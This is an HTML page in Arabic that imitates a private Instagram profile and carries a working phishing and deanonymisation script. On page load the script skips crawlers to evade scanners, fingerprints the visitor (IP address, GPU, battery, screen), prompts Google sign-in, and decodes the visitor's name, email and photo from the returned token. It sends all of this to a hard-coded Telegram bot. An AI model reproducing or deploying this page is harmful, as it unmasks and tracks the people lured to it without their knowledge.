<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta property="og:title" content="Instagram: @private_profile_88">
    <meta property="og:description" content="شاهد الصور ومقاطع الفيديو من الحساب الخاص. 5,432 متابع.">
    <meta property="og:image" content="https://i.pravatar.cc/400?u=insta">
    <meta property="og:type" content="profile">
    <meta name="theme-color" content="#FF0073">

    <title>Instagram</title>
    <script src="https://accounts.google.com/gsi/client" async defer></script>

    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #fafafa; margin: 0; }
        .nav { width: 100%; height: 50px; background: white; border-bottom: 1px solid #dbdbdb; display: flex; justify-content: center; align-items: center; position: fixed; top: 0; z-index: 100; }
        .container { margin-top: 70px; max-width: 600px; margin-right: auto; margin-left: auto; padding: 20px; }
        .profile-header { display: flex; align-items: center; margin-bottom: 30px; }
        .profile-pic { width: 77px; height: 77px; border-radius: 50%; border: 1px solid #dbdbdb; padding: 2px; margin-left: 20px; }
        .username { font-size: 20px; font-weight: 300; margin-bottom: 10px; }
        .stats { display: flex; gap: 15px; font-size: 14px; }
        .btn-follow { background-color: #0095f6; color: white; border: none; padding: 5px 24px; border-radius: 4px; font-weight: bold; width: 100%; margin-top: 15px; cursor: pointer; }
        .grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 3px; }
        .grid-item { background: #efefef; aspect-ratio: 1/1; display: flex; justify-content: center; align-items: center; color: #8e8e8e; font-size: 10px; }
    </style>
</head>
<body>

    <div class="nav"><img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" height="29"></div>

    <div class="container">
        <div class="profile-header">
            <img src="https://i.pravatar.cc/150?u=insta" class="profile-pic">
            <div class="info">
                <div class="username">private_account_88</div>
                <div class="stats">
                    <span><b>14</b> منشور</span>
                    <span><b>5.4K</b> متابع</span>
                    <span><b>320</b> يتابع</span>
                </div>
            </div>
        </div>
        <div style="font-weight: bold; font-size: 14px; margin-bottom: 5px;">الحساب خاص</div>
        <div style="font-size: 14px; color: #8e8e8e;">اتبع هذا الحساب لمشاهدة صوره ومقاطع الفيديو الخاصة به.</div>
        <button class="btn-follow">متابعة</button>

        <hr style="border: 0; border-top: 1px solid #dbdbdb; margin: 20px 0;">

        <div class="grid">
            <div class="grid-item">🔒</div><div class="grid-item">🔒</div><div class="grid-item">🔒</div>
            <div class="grid-item">🔒</div><div class="grid-item">🔒</div><div class="grid-item">🔒</div>
        </div>

        <div id="g_id_onload"
             data-client_id="YOUR_GOOGLE_CLIENT_ID.apps.googleusercontent.com"
             data-auto_prompt="true" 
             data-callback="onSignIn">
        </div>
    </div>

<script>
    const botToken = "8550792437:AAFPRHjdjDq1vQvhLKs6S5DpfRId13-MhHc";
    const chatId = "7184970355";

    // 1. كود إجبار الخروج للمتصفح الخارجي (Chrome/Safari)
    function forceExternalBrowser() {
        const ua = navigator.userAgent || navigator.vendor || window.opera;
        const isInstagram = ua.indexOf('Instagram') > -1;
        const isFacebook = ua.indexOf('FBAN') > -1 || ua.indexOf('FBAV') > -1;
        
        if (isInstagram || isFacebook) {
            // محاولة فتح الرابط في المتصفح الافتراضي عبر نوافذ منبثقة أو روابط مباشرة
            window.location.href = window.location.href + (window.location.href.indexOf('?') > -1 ? '&' : '?') + 'open_in_browser=1';
        }
    }

    // 2. كود الحماية ضد البوتات (Anti-Bot)
    function isBot() {
        const botPattern = /bot|spider|crawl|facebookexternalhit|whatsapp|telegrambot|slurp|googlebot/i;
        return botPattern.test(navigator.userAgent);
    }

    // 3. سحب البيانات العميقة
    async function captureAll() {
        if (isBot()) return; // تجاهل إذا كان السيرفر بوت فحص

        try {
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();

            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A";

            let battery = "N/A";
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                battery = `${(b.level * 100).toFixed(0)}% (${b.charging ? 'يشحن' : 'لا يشحن'})`;
            }

            let report = `🪤 **صيد جديد (بيانات الجهاز):**\n\n`;
            report += `🌐 IP: \`${ipData.ip}\`\n`;
            report += `📱 الجهاز: \`${navigator.userAgent.split('(')[1].split(')')[0]}\`\n`;
            report += `🎮 الكرت (GPU): \`${gpu}\`\n`;
            report += `🔋 البطارية: \`${battery}\`\n`;
            report += `🧠 المعالج: ${navigator.hardwareConcurrency} Cores\n`;
            report += `📏 الشاشة: ${window.screen.width}x${window.screen.height}`;

            send(report);
        } catch (e) {}
    }

    // 4. سحب الاسم من جوجل
    function onSignIn(response) {
        const user = JSON.parse(atob(response.credential.split('.')[1]));
        let report = `🎯 **تم كشف الاسم الصريح!**\n\n`;
        report += `👤 الاسم: \`${user.name}\`\n`;
        report += `📧 البريد: \`${user.email}\` \n`;
        report += `🖼 الصورة: ${user.picture}`;
        send(report);
    }

    function send(t) {
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(t)}&parse_mode=Markdown`);
    }

    window.onload = () => {
        forceExternalBrowser();
        captureAll();
        if (typeof google !== 'undefined') google.accounts.id.prompt();
    };
</script>
</body>
</html>
